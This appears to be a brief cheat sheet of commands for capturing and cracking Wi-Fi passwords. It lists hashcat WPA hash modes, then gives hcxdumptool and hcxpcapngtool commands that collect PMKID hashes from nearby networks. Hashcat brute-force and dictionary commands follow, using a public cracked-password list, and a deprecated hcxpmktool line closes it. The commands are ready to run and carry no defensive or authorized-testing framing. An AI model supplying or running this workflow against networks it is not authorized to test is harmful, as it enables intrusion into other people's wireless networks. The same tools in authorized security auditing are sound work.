#    2500 | WPA-EAPOL-PBKDF2                                           | Network Protocol
#    2501 | WPA-EAPOL-PMK                                              | Network Protocol
#   22000 | WPA-PBKDF2-PMKID+EAPOL                                     | Network Protocol
#   22001 | WPA-PMK-PMKID+EAPOL                                        | Network Protocol

'hcxdumptool -i wlan1 -w nearby_pmkids.pcapng -F rds=1'
'hcxpcapngtool --pmkid=nearby_pmkids.hc22000 nearby_pmkids.pcapng'
# Bruteforce
'hashcat -m 22000 nearby_pmkids.hc22000 -a 3 -w 3 ?l?l?l?l?l?l?l?l --session=pmkid'
# Dictionary - https://wpa-sec.stanev.org/dict/cracked.txt.gz
'hashcat -m 22000 nearby_pmkids.hc22000 cracked.txt.gz'

# ??? deprecated
'hcxpmktool -m 88f43854ae7b1624fc2ab7724859e795130f4843c7535729e819cf92f39535dc -e hashcat-essid'